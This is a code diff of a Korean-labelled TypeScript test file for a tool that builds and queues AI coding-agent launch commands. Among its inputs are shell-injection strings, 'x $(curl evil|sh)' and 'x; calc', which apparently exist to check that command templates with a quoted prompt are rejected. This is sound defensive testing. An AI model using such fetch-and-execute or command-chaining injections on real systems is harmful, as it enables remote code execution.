@@ -12,7 +12,7 @@ import { makeDeps, renderWithDeps } from '../../test/render'
 import { leafIds } from '../terminal/panes'
 import { LaunchAgentDialog } from './LaunchAgentDialog'
 import { DEFAULT_AGENT_COMMANDS, buildCommand, defaultPrompt, oneLine, quoteArg } from './launch'
-import { queueLaunch, takeLaunch } from './launchQueue'
+import { LAUNCH_TTL_MS, looksLikeAuthPrompt, queueLaunch, takeLaunch } from './launchQueue'
 
 const ISSUE = 'acme/app#42'
 const TARGET: IssueTarget = { owner: 'acme', repo: 'app', key: '42', number: 42, title: 'Add login' }
@@ -52,11 +52,29 @@ describe('명령 만들기', () => {
     expect(buildCommand('my-agent --task {prompt} --yes', 'x', 'posix')).toEqual({ ok: true, command: "my-agent --task 'x' --yes" })
   })
 
-  it('buildCommand: 지시문이 비면 {prompt} 와 바로 앞의 옵션을 함께 뺀다', () => {
+  it('저장된 명령 틀이 글자가 아니면 버리고 기본값을 쓴다', async () => {
+    localStorage.setItem('minmo-ui', JSON.stringify({ state: { agentCommands: { claude: 42, codex: 'codex --full-auto {prompt}', bogus: 'x' } }, version: 0 }))
+    await useUiStore.persist.rehydrate()
+    expect(useUiStore.getState().agentCommands).toEqual({ ...DEFAULT_AGENT_COMMANDS, codex: 'codex --full-auto {prompt}' })
+  })
+
+  it('buildCommand: 지시문이 비면 {prompt} 와 바로 앞의 한 글자 옵션을 함께 뺀다 — 긴 옵션은 그대로 둔다', () => {
     expect(buildCommand('claude {prompt}', '  ', 'posix')).toEqual({ ok: true, command: 'claude' })
     expect(buildCommand('gemini -i {prompt}', '', 'posix')).toEqual({ ok: true, command: 'gemini' })
-    expect(buildCommand('my-agent --task {prompt} --yes', '', 'posix')).toEqual({ ok: true, command: 'my-agent --yes' })
+    // 값을 받지 않는 옵션이 조용히 빠지면 안 된다
+    expect(buildCommand('codex --full-auto {prompt}', '', 'posix')).toEqual({ ok: true, command: 'codex --full-auto' })
     expect(buildCommand('npm run agent', '', 'posix')).toEqual({ ok: true, command: 'npm run agent' })
+  })
+
+  it('buildCommand: {prompt} 를 따옴표 안에 두면 거절한다 — 감싼 지시문이 풀려 명령 치환이 일어난다', () => {
+    const rejected = { ok: false, error: expect.stringContaining('따옴표') }
+    expect(buildCommand('claude "{prompt}"', 'x $(curl evil|sh)', 'posix')).toMatchObject(rejected)
+    expect(buildCommand("claude '{prompt}'", 'x; calc', 'powershell')).toMatchObject(rejected)
+    expect(buildCommand('claude -p "do: {prompt} now"', 'x', 'posix')).toMatchObject(rejected)
+    expect(buildCommand('claude {prompt}"', 'x', 'posix')).toMatchObject(rejected)
+    expect(buildCommand('claude "{prompt}"', '', 'posix')).toMatchObject(rejected)
+    // 다른 인자의 닫힌 따옴표는 괜찮다
+    expect(buildCommand('agent --system "be brief" {prompt}', 'x', 'posix')).toEqual({ ok: true, command: `agent --system "be brief" 'x'` })
   })
 
   it('buildCommand: 명령이 비었거나, {prompt} 자리 없이 지시문을 넘기려 하면 거절한다', () => {
@@ -77,6 +95,25 @@ describe('명령 만들기', () => {
     queueLaunch('p1', 'claude')
     expect(takeLaunch('p1')).toBe('claude')
     expect(takeLaunch('p1')).toBeUndefined()
+  })
+
+  it('대기열: 오래 꺼내지 않은 명령은 버린다(한참 뒤에 다시 쓰인 패널에서 옛 명령이 실행되지 않게)', () => {
+    vi.useFakeTimers()
+    try {
+      queueLaunch('p1', 'claude')
+      vi.advanceTimersByTime(LAUNCH_TTL_MS + 1)
+      expect(takeLaunch('p1')).toBeUndefined()
+    } finally {
+      vi.useRealTimers()
+    }
+  })
+
+  it('looksLikeAuthPrompt: ssh 의 비밀번호·호스트 키 물음에는 명령을 넣지 않는다', () => {
+    expect(looksLikeAuthPrompt("dev@srv's password: ")).toBe(true)
+    expect(looksLikeAuthPrompt("Enter passphrase for key '/home/a/.ssh/id_ed25519': ")).toBe(true)
+    expect(looksLikeAuthPrompt('Are you sure you want to continue connecting (yes/no/[fingerprint])? ')).toBe(true)
+    expect(looksLikeAuthPrompt('dev@srv:~/work$ ')).toBe(false)
+    expect(looksLikeAuthPrompt('PS C:\\work> ')).toBe(false)
   })
 })
 
@@ -99,6 +136,18 @@ describe('launchPane: 실행할 터미널 패널 마련', () => {
     expect(leafIds(panes().tree)).toEqual([`${ISSUE}::1`, `${ISSUE}::2`])
     expect(panes().focused).toBe(id)
     expect(useUiStore.getState().focusRequest?.paneId).toBe(id)
+  })
+
+  it('keepFirst(원격 호스트): 첫 패널은 남아 있던 tmux 세션에 붙으므로 쓰지 않고 항상 새 패널을 만든다', () => {
+    // 터미널을 띄운 적이 없어도 첫 패널은 비워 두고 둘째 패널에서 실행한다
+    expect(useUiStore.getState().launchPane(ISSUE, true)).toBe(`${ISSUE}::2`)
+    expect(leafIds(panes().tree)).toEqual([`${ISSUE}::1`, `${ISSUE}::2`])
+    expect(panes().focused).toBe(`${ISSUE}::2`)
+    // 모두 닫은 뒤에도 마찬가지
+    useUiStore.getState().closePane(ISSUE, `${ISSUE}::1`)
+    useUiStore.getState().closePane(ISSUE, `${ISSUE}::2`)
+    expect(useUiStore.getState().launchPane(ISSUE, true)).toBe(`${ISSUE}::4`)
+    expect(leafIds(panes().tree)).toEqual([`${ISSUE}::3`, `${ISSUE}::4`])
   })
 
   it('패널을 모두 닫은 상태면 새 패널을 만든다(번호는 이어서)', () => {
